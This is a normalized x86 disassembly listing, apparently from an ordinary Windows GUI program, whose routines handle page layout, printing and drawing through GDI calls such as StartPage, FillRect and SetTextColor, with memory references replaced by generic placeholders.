mov [ esp + 0x84 ] 0x1f4
mov [ esp + 0x88 ] 0x64
mov [ esp + 0x8c ] 0x32
mov [ esp + 0x90 ] ebp
jl r-xdata
mov esi eax
mov ecx 0x2
mov [ rw-data ] ecx
cmp ecx 0x4
jle r-xdata
mov ecx rw-data
call sub_404310
mov esi [ rw-data ]
mov ecx [ rw-data ]
xor edi edi
mov [ rw-data ] ebp
mov [ esp + 0x1c ] edi
xor edx edx
lea esp [ esp ]
sub ecx eax
add ecx esi
push ecx
call edi
jmp r-xdata
mov ecx [ esp + ecx * 4 + 0x80 ]
mov edx eax
sub edx esi
cmp edx ecx
jae r-xdata
mov eax esi
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
xor esi esi
cmp eax ebx
mov [ esp + 0x1c ] edi
mov [ esp + 0x34 ] ebp
mov [ esp + 0x38 ] esi
je r-xdata
mov eax [ ecx + edx * 4 ]
cmp eax ebp
je r-xdata
cmp edx eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x20 ] ecx
mov cl [ rw-data ]
test cl cl
jne r-xdata
inc edi
cmp [ eax + 0xd48 ] ebx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x2c ] 0xffffffff
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x2c ] ebx
jmp r-xdata
cmp [ rw-data ] ebp
je r-xdata
cmp ecx ebp
jne r-xdata
inc edx
jmp r-xdata
add ecx ecx
add edx edx
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] edx
mov [ esp + 0x40 ] 0x2
cmp [ rw-data ] ebp
jle r-xdata
cmp eax 0x2
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] edx
mov [ esp + 0x40 ] ebx
je r-xdata
cmp edx ebp
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ebp ecx
jl r-xdata
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov edi edi
mov ecx [ rw-data ]
mov [ esp + 0x20 ] ecx
mov ecx [ rw-data ]
jmp r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x20 ] ecx
mov ecx [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x50 ] edx
jne r-xdata
xor ebp ebp
mov [ esp + 0x18 ] ebp
nop
cmp esi edx
jge r-xdata
cmp edx ebp
mov [ esp + 0x24 ] ecx
jl r-xdata
mov ecx rw-data
xor esi esi
call sub_401420
mov edi [ Sleep@IAT ]
mov ebx 0x1
xor ebp ebp
jmp r-xdata
mov ecx [ rw-data ]
imul ecx [ rw-data ]
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov ebp [ rw-data ]
mov eax 0x51eb851f
mul ecx
shr edx 0x5
mov [ esp + 0x28 ] edx
mov edx ebx
imul edx edx 0x70
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x10 ] ebx
lea esi [ edx + edi + 0x30 ]
mov eax [ esp + 0x2c ]
inc ebp
neg eax
cmp ebp 0x2
mov [ esp + 0x18 ] ebp
mov [ esp + 0x2c ] eax
jl r-xdata
mov ecx [ esp + 0x40 ]
xor eax eax
cmp ecx eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x30 ] eax
jle r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + ebp * 4 + 0x34 ]
cmp ecx [ esp + ebp * 4 + 0x44 ]
jge r-xdata
mov ebp [ esp + 0x34 ]
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x48 ]
jmp r-xdata
mov [ esp + 0x17 ] 0x0
jmp r-xdata
mov [ esp + 0x10 ] ebx
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0x28 ]
jae r-xdata
cmp ebx edx
jge r-xdata
lea eax [ esi + ebp ]
cmp eax [ esp + 0x1c ]
jge r-xdata
mov ecx [ esp + ebp * 4 + 0x20 ]
mov edx [ esp + 0x2c ]
mov al [ esp + 0x17 ]
add ecx edx
test al al
mov [ esp + ebp * 4 + 0x20 ] ecx
mov esi ecx
jne r-xdata
cmp [ esi ] 0x0
mov eax [ esi + 0x10 ]
je r-xdata
mov esi [ esp + ebp * 4 + 0x20 ]
test esi esi
jl r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
inc ebx
add esi 0x70
jmp r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x18 ]
inc [ esp + eax * 4 + 0x34 ]
mov esi [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
mov eax [ esp + 0x1c ]
lea edx [ esi + ecx ]
cmp edx eax
jge r-xdata
mov edi [ rw-data ]
test edi edi
mov ebx [ rw-data ]
jne r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x40 ]
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov ebp [ esp + 0x18 ]
inc eax
cmp eax ecx
mov [ esp + 0x30 ] eax
jl r-xdata
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp eax 0x2
mov eax [ rw-data ]
test eax eax
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + ecx * 4 + 0x20 ]
test eax eax
mov [ esp + 0x3c ] eax
jl r-xdata
imul esi esi 0x70
mov eax [ esi + edi + 0x30 ]
add esi edi
test eax eax
je r-xdata
cmp esi edx
jge r-xdata
test edi edi
jne r-xdata
cmp esi edx
jl r-xdata
test ebp ebp
je r-xdata
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x18 ]
nop
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ rw-data ]
sub eax ebp
sar eax 0x2
test eax eax
jbe r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
sub esi edx
mov [ esp + ebp * 4 + 0x20 ] esi
mov [ esp + 0x17 ] 0x1
cmp [ ebp + ebx * 4 ] 0x0
mov edi [ esi - 0x10 ]
je r-xdata
mov [ esp + 0x10 ] 0x0
jmp r-xdata
cmp [ esp + 0x3c ] edx
jge r-xdata
cmp edi [ rw-data ]
mov [ esp + 0x10 ] ebx
ja r-xdata
mov eax [ esp + 0x1c ]
add eax edi
mov edi [ rw-data ]
mov [ esp + 0x1c ] eax
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
mov esi ebx
imul esi esi 0x70
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x68 ]
lea eax [ esi + edx ]
push ecx
push eax
call sub_4053a0
add esp 0x14
test eax eax
jge r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ebp [ rw-data ]
mov eax [ rw-data ]
add ebp edi
cmp ebp eax
mov [ rw-data ] ebp
jbe r-xdata
mov edx [ rw-data ]
mov [ esi + edx + 0x30 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x10 ]
mov ecx [ ecx + edx * 4 ]
cmp ecx 0xffffffff
je r-xdata
cmp [ esp + 0x10 ] eax
jge r-xdata
mov ecx [ esp + 0x5c ]
mov edx [ rw-data ]
lea eax [ esp + 0x10 ]
mov [ edx + ebx * 4 ] ecx
push eax
mov ecx rw-data
call sub_46a5f0
jmp r-xdata
mov edi [ rw-data ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
inc [ esp + 0x10 ]
jmp r-xdata
mov eax [ esp + 0x3c ]
imul ecx ecx 0x70
mov edx [ rw-data ]
imul eax eax 0x70
mov ebx [ eax + edx + 0x14 ]
add eax edx
add ecx edx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ebx [ rw-data ]
mov edx [ ebx + edx * 4 ]
mov edx [ edx + esi * 4 ]
mov esi [ rw-data ]
imul edx edx 0x70
sub ebp [ edx + esi + 0x20 ]
lea edx [ eax * 4 ]
sub ecx edx
cmp edi eax
mov [ rw-data ] ebp
ja r-xdata
sub edx edi
mov ecx [ esp + 0xa4 ]
mov edx [ ecx ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + eax * 4 + 0x20 ]
push 0x1
push 0x0
push edx
push ecx
call sub_4706c0
add esp 0x10
test eax eax
jl r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov esi [ esp + 0x10 ]
cmp esi eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov eax [ edx + ecx * 4 ]
push eax
call [ LocalFree@IAT ]
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov edx [ rw-data ]
cmp edx eax
ja r-xdata
sub eax edi
mov cl [ rw-data ]
test cl cl
je r-xdata
mov eax [ esp + 0x28 ]
mov dl [ rw-data ]
mov [ esp + eax * 4 + 0x54 ] esi
inc eax
test dl dl
mov [ esp + 0x28 ] eax
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
push eax
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
cmp edx ebx
jb r-xdata
cmp edx ebx
mov ebp edx
jb r-xdata
mov edx [ ecx + 0x14 ]
test edx edx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov [ edx + ecx * 4 ] 0x0
mov eax [ rw-data ]
test eax eax
mov edi [ rw-data ]
mov ecx [ rw-data ]
je r-xdata
sub eax edx
mov ecx [ rw-data ]
test ecx ecx
jle r-xdata
mov edx [ esp + 0x30 ]
mov esi [ esp + 0x40 ]
inc edx
cmp edx esi
jne r-xdata
mov edx [ rw-data ]
test edx edx
jle r-xdata
mov ecx [ rw-data ]
mov eax [ esp + 0x18 ]
inc [ esp + eax * 4 + 0x34 ]
mov [ esp + 0x30 ] 0x1
xor eax eax
cmp edx ebx
setne al
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
mov ebp ebx
mov ebp [ rw-data ]
cmp ebp [ rw-data ]
ja r-xdata
inc ecx
lea eax [ edi * 4 ]
cmp eax ecx
mov [ rw-data ] ecx
ja r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x1
mov esi [ edx + eax * 4 ]
call sub_40af00
push eax
push 0x1
mov ecx esi
call sub_4440b0
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
lea esi [ ecx + 0x4 ]
mov esi [ ecx + 0x4 ]
jmp r-xdata
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx eax
lea esi [ edx * 4 ]
mov ebx esi
mov esi ecx
sub esi ebx
cmp edi edx
ja r-xdata
mov ebx [ esp + 0x10 ]
dec [ rw-data ]
jne r-xdata
xor ecx ecx
mov [ rw-data ] ecx
xor esi esi
mov [ esp + 0x9c ] 0x0
mov [ esp + 0x10 ] esi
cmp eax 0x1
mov [ esp + 0x9c ] 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi eax
mov ecx ebp
xor eax eax
[ esi ] [ edi ]
je r-xdata
xor ecx ecx
mov [ rw-data ] ecx
mov edx [ esp + 0x54 ]
mov eax [ ecx + edx * 4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x54 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
mov [ rw-data ] 0x1
mov esi [ eax + ecx * 4 ]
call sub_40af00
push eax
push 0x1
mov ecx esi
call sub_4440b0
mov [ rw-data ] 0x0
mov edi eax
mov eax [ esp + 0x58 ]
mov esi [ ecx + eax * 4 ]
test esi esi
mov [ esp + 0x3c ] edi
je r-xdata
inc [ eax + 0xd48 ]
mov ecx [ rw-data ]
mov edi eax
mov [ esp + 0x3c ] edi
jmp r-xdata
inc [ eax + 0xd48 ]
mov [ esp + 0x10 ] esi
inc [ esi + 0xd48 ]
test edi edi
je r-xdata
test esi esi
je r-xdata
mov eax [ edi + 0xd20 ]
test eax eax
jne r-xdata
test esi esi
mov [ esp + 0x9c ] 0x0
je r-xdata
mov eax [ esi + 0xd20 ]
test eax eax
jne r-xdata
mov eax [ edi + 0xd24 ]
test eax eax
jne r-xdata
test edi edi
mov [ esp + 0x9c ] 0xffffffff
je r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ esi + 0xd24 ]
test eax eax
jne r-xdata
mov eax [ edi + 0xcb8 ]
test eax eax
je r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0xcb8 ]
test eax eax
jne r-xdata
test esi esi
lea ecx [ esp + 0x70 ]
push ecx
lea edx [ esp + 0x64 ]
push edx
push ecx
mov [ esp + 0x5c ] esp
mov eax esp
je r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
test edi edi
push ecx
mov [ eax ] esi
mov [ esp + 0x60 ] esp
mov eax esp
je r-xdata
inc [ esi + 0xd48 ]
mov [ eax ] edi
call sub_45fd90
fcomp [ r--data ]
add esp 0x10
fnstsw ax
test ah 0x5
jpe r-xdata
inc [ edi + 0xd48 ]
test edi edi
je r-xdata
test esi esi
je r-xdata
mov eax [ edi + 0xd20 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xd20 ]
test eax eax
jne r-xdata
mov eax [ edi + 0xd24 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xd24 ]
test eax eax
jne r-xdata
mov eax [ edi + 0xcb8 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xcb8 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
setne al
push rw-data
push 0x1
push eax
call sub_40af00
mov edx [ rw-data ]
mov ebp [ esp + 0x70 ]
xor ecx ecx
mov cl [ rw-data ]
push eax
mov eax [ esp + 0x7c ]
sub eax ebp
push ecx
mov ecx [ esp + 0x7c ]
push edx
sub ecx [ esp + 0x78 ]
push eax
push ecx
mov ecx edi
call sub_441880
mov ebp [ rw-data ]
test ebp ebp
setne dl
push rw-data
push 0x1
push edx
call sub_40af00
mov ecx [ rw-data ]
mov edx [ esp + 0x88 ]
mov ebp [ esp + 0x80 ]
push eax
xor eax eax
mov al [ rw-data ]
sub edx ebp
push eax
mov eax [ esp + 0x8c ]
push ecx
push edx
sub eax [ esp + 0x8c ]
push eax
mov ecx esi
call sub_441880
sub_474e40
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0ec8
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x20
push edi
xor edi edi
cmp eax edi
je r-xdata
mov ecx [ esp + 0x24 ]
pop edi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
push ebx
push ebp
push esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov ebp [ esp + 0x48 ]
mov esi [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
mov ebx [ esp + 0x4c ]
sub ebp esi
push edi
push ebp
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] edi
mov [ esp + 0x20 ] ebp
sub ebx edx
call sub_41d110
fild [ rw-data ]
mov eax [ rw-data ]
fld [ r--data ]
mov ecx [ rw-data ]
cdq
fmul st1
sub eax edx
sar eax 0x1
neg ecx
sub ecx eax
mov [ esp + 0x14 ] ecx
xor esi esi
cmp ebp edi
fild [ esp + 0x14 ]
fmul st1
fdiv st2
fstp [ esp + 0x10 ]
fild [ esp + 0x18 ]
fdivr st1
fstp [ esp + 0x18 ]
fstp st0
fstp st0
jle r-xdata
cmp [ rw-data ] edi
jne r-xdata
fld [ esp + 0x10 ]
push ecx
fcos
fmul [ r--data ]
fstp [ esp ]
call sub_452500
fld [ esp + 0x1c ]
mov ecx 0xff
fadd [ esp + 0x14 ]
sub ecx eax
mov eax [ esp + 0x28 ]
mov edx ecx
shl edx 0x8
fstp [ esp + 0x14 ]
or edx ecx
shl edx 0x8
or edx ecx
add esp 0x4
mov [ eax + esi * 4 ] edx
inc esi
cmp esi ebp
jl r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov eax [ rw-data ]
pop esi
pop ebp
dec eax
pop ebx
mov [ rw-data ] eax
jne r-xdata
mov [ esp + 0x14 ] ebx
lea esp [ esp ]
push eax
call [ LocalLock@IAT ]
mov ecx eax
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jge r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
add edi eax
dec ecx
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] ecx
jne r-xdata
mov edx [ edi ]
mov eax [ esp + 0x24 ]
mov esi [ eax + ebx * 4 ]
mov ecx edx
not ecx
mov eax ecx
xor ecx esi
and ecx 0xfefefe
and eax esi
lea ecx [ ecx + eax * 2 ]
shr ecx 0x8
and ecx 0x10101
add ecx 0x7f7f7f
xor ecx 0x7f7f7f
mov eax ecx
or ecx edx
or eax esi
sub ecx eax
and edx 0xff000000
and ecx 0xfefeff
or ecx edx
mov edx [ esp + 0x18 ]
mov [ edi ] ecx
add edi edx
inc ebx
cmp ebx ebp
jl r-xdata
movzx eax [ rw-data ]
imul eax [ rw-data ]
mov edi [ rw-data ]
cdq
and edx 0x7
add eax edx
inc edi
mov [ rw-data ] edi
mov edi [ rw-data ]
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
sar edi 0x3
and edi 0x1f
mov edx eax
imul edx [ esp + 0x44 ]
mov [ esp + 0x18 ] edi
imul edi [ esp + 0x40 ]
add ecx edx
add edi ecx
test ebx ebx
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] edi
jle r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ rw-data ] 0x0
xor ebx ebx
test ebp ebp
jle r-xdata
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_475090
push ecx
mov al [ esp + 0x3 ]
push esi
mov esi ecx
mov [ esi ] al
call sub_4603b0
mov [ esi + 0x4 ] eax
mov [ eax + 0x15 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
pop ecx
retn
sub_4750d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0ee8
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi [ ecx + 0x4 ]
test esi esi
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x7
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0x18 ]
cmp edx eax
jae r-xdata
lea ecx [ esp + 0x1c ]
mov [ esp + 0x10 ] 0xffffffff
call sub_460f30
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x84
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
sar edx 0x7
cmp eax edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
sar edx 0x7
xor edx edx
jmp r-xdata
push ecx
mov edx esp
mov [ esp + 0x1c ] esp
mov [ edx ] edi
mov edx [ ecx + 0x4 ]
push ecx
shl eax 0x7
mov esi esp
add eax edx
mov [ esi ] eax
lea eax [ esp + 0x20 ]
mov [ esp + 0x20 ] esp
push eax
call sub_46b4b0
sub eax edx
mov edx [ ecx + 0x8 ]
lea esi [ esp + 0x1c ]
push esi
push eax
push ecx
mov eax esp
mov [ esp + 0x24 ] esp
mov [ eax ] edx
call sub_46cc30
jmp r-xdata
sub_475190
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_46b3f0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_4751c0
push 0xffffffff
push sub_4c0f0b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x570
mov dl [ esp + 0x5a4 ]
or eax 0xffffffff
push ebx
push ebp
mov [ esp + 0x3c ] eax
mov [ esp + 0x44 ] eax
xor eax eax
xor ebp ebp
test dl dl
mov edx [ rw-data ]
sete al
cmp edx ebp
push esi
push edi
lea eax [ eax + eax - 0x1 ]
mov [ esp + 0x48 ] eax
je r-xdata
cmp edx ebp
mov eax [ rw-data ]
mov [ esp + 0x90 ] eax
je r-xdata
add eax eax
mov [ esp + 0x48 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
xor eax eax
test [ esp + 0x598 ] 0x1
je r-xdata
mov bl [ esp + 0x5b4 ]
test bl bl
je r-xdata
test [ esp + 0x598 ] 0x1
je r-xdata
dec eax
and eax 0x1
mov [ esp + 0x90 ] eax
cmp ecx 0x3
ja r-xdata
add ecx 0xfffffffe
and ecx 0x3
add ecx 0xfffffffe
and ecx 0x3
xor eax eax
jmp r-xdata
jmp [ ecx * 4 + jump_table_475d7c ]
mov ecx [ esp + 0x580 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x57c
retn
mov [ esp + eax + 0x88 ] ebp
mov [ esp + eax + 0x78 ] esi
mov [ esp + eax + 0x80 ] 0x1
mov [ esp + eax + 0x94 ] ebp
jmp r-xdata
mov ecx 0x1
mov [ esp + eax + 0x88 ] ebp
mov [ esp + eax + 0x78 ] edi
mov [ esp + eax + 0x94 ] ecx
jmp r-xdata
lea ecx [ esi - 0x1 ]
mov [ esp + eax + 0x94 ] ebp
jmp r-xdata
lea ecx [ edi - 0x1 ]
mov [ esp + eax + 0x94 ] 0x1
add eax 0x4
cmp eax 0x8
jl r-xdata
mov [ esp + eax + 0x80 ] ecx
mov [ esp + eax + 0x88 ] ecx
or ecx 0xffffffff
mov [ esp + eax + 0x78 ] ecx
cmp edx ebp
mov ecx [ eax + rw-data ]
je r-xdata
mov edx [ esp + 0x5a4 ]
mov eax [ esp + 0x5ac ]
sub eax edx
cdq
idiv esi
mov ecx [ esp + 0x5a8 ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x5b0 ]
sub eax ecx
cdq
idiv edi
mov [ esp + 0x38 ] eax
cmp [ rw-data ] ebp
jne r-xdata
mov al [ esp + 0x59c ]
test al al
mov esi [ esp + 0x5a0 ]
jne r-xdata
push 0x2
push esi
call [ SetBkMode@IAT ]
push 0xffffff
push esi
call [ SetTextColor@IAT ]
push 0xb43c28
push esi
call [ SetBkColor@IAT ]
cmp esi ebp
je r-xdata
push esi
call [ StartPage@IAT ]
test eax eax
jle r-xdata
lea ecx [ esp + 0x5a4 ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
push ebp
call [ GetStockObject@IAT ]
push eax
lea eax [ esp + 0x5a8 ]
push eax
push esi
call [ FillRect@IAT ]
push ebp
push r--data
push r--data
push ebp
call [ MessageBoxA@IAT ]
cmp esi ebp
je r-xdata
mov al [ esp + 0x59c ]
test al al
mov ebx [ esp + 0x44 ]
mov edi [ esp + 0x4c ]
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x8c ]
cmp eax [ esp + 0x7c ]
mov [ esp + 0x74 ] eax
je r-xdata
push ebp
call [ GetStockObject@IAT ]
push eax
lea edx [ esp + 0x5a8 ]
push edx
push esi
call [ FillRect@IAT ]
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
push esi
call [ EndPage@IAT ]
test eax eax
jg r-xdata
mov eax [ esp + 0x88 ]
cmp eax [ esp + 0x78 ]
mov [ esp + 0x70 ] eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
mov ecx [ esp + 0x590 ]
mov ebx [ ecx ]
mov eax [ esp + 0x74 ]
mov edx [ esp + 0x84 ]
mov ecx [ esp + 0x7c ]
add eax edx
cmp eax ecx
mov [ esp + 0x74 ] eax
jne r-xdata
mov [ esp + 0xac ] rw-data
mov eax [ esp + 0x590 ]
mov ecx [ esp + 0x594 ]
mov [ eax ] ebx
mov [ ecx ] edi
mov eax 0x1
mov edx [ esp + 0x594 ]
mov edi [ edx ]
mov esi [ esp + 0x5a0 ]
xor ebp ebp
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov al [ esp + 0x59c ]
test al al
jne r-xdata
mov eax [ esp + 0x94 ]
mov ecx [ esp + 0x64 ]
test eax eax
mov eax [ esp + 0x5a4 ]
jne r-xdata
mov edx [ esp + 0x594 ]
mov eax [ edx ]
mov ecx [ esp + 0x590 ]
mov edx [ ecx ]
inc eax
push eax
mov eax [ esp + 0x59c ]
inc edx
push edx
inc eax
push eax
lea ecx [ esp + 0x1bc ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ rw-data ]
add esp 0x14
lea edx [ esp + 0x1b0 ]
push edx
push 0x0
push 0xc
push eax
call [ SendMessageA@IAT ]
mov esi [ esp + 0x74 ]
mov edi [ esp + 0x70 ]
mov esi [ esp + 0x70 ]
mov edi [ esp + 0x74 ]
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x588 ] 0xffffffff
call sub_401420
mov edx [ esp + 0x590 ]
cmp [ edx ] eax
jg r-xdata
mov ebp esi
imul ebp ecx
add ebp eax
inc esi
imul esi ecx
mov ecx [ esp + 0x38 ]
mov ebx edi
imul ebx ecx
add esi eax
mov eax [ esp + 0x5a8 ]
add ebx eax
inc edi
imul edi ecx
add edi eax
or eax 0xffffffff
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x598 ]
imul eax eax 0x70
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x48 ]
imul eax eax 0x70
mov [ esp + 0x9c ] ebp
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x34 ] eax
lea esp [ esp ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
push eax
mov [ esp + 0x3c ] eax
call sub_4706c0
mov edx [ esp + 0x58 ]
mov ecx [ esp + 0x5a8 ]
add ecx edx
mov edx [ esp + 0x20 ]
mov [ esp + 0x5a8 ] ecx
mov ecx [ esp + 0x44 ]
add edx ecx
add esp 0x10
test eax eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] edx
jge r-xdata
mov eax [ esp + 0x1c ]
mov edx [ rw-data ]
shl eax 0x2
mov [ esp + 0x10 ] eax
mov eax [ eax + edx ]
mov [ esp + 0x50 ] eax
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx [ esp + 0x58 ]
call sub_4440b0
mov edx [ rw-data ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
mov ecx [ eax + edx ]
mov [ esp + 0x50 ] ecx
call sub_40af00
mov ecx [ esp + 0x50 ]
xor edx edx
mov dl [ rw-data ]
push eax
push edx
call sub_444100
mov [ esp + 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ esp + 0x59c ]
test al al
jne r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x14 ]
imul eax [ esp + 0x64 ]
imul ecx [ esp + 0x38 ]
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_4a9250
add esp 0x4
test al al
je r-xdata
mov ecx [ esp + 0x594 ]
mov eax [ esp + 0x598 ]
cmp eax [ ecx ]
jg r-xdata
mov eax [ rw-data ]
mov ecx edx
cmp [ ecx + eax + 0x18 ] 0x10
jb r-xdata
mov eax ecx
cdq
idiv [ esp + 0x24 ]
mov esi eax
mov eax [ esp + 0x64 ]
sub eax esi
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
add ecx ebp
mov [ esp + 0x3c ] esi
add esi ecx
mov eax ebx
cdq
idiv [ esp + 0x14 ]
mov ecx ebp
mov edi eax
mov eax [ esp + 0x38 ]
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax ebx
mov [ esp + 0x68 ] edi
add edi eax
jmp r-xdata
mov ebx [ esp + 0x598 ]
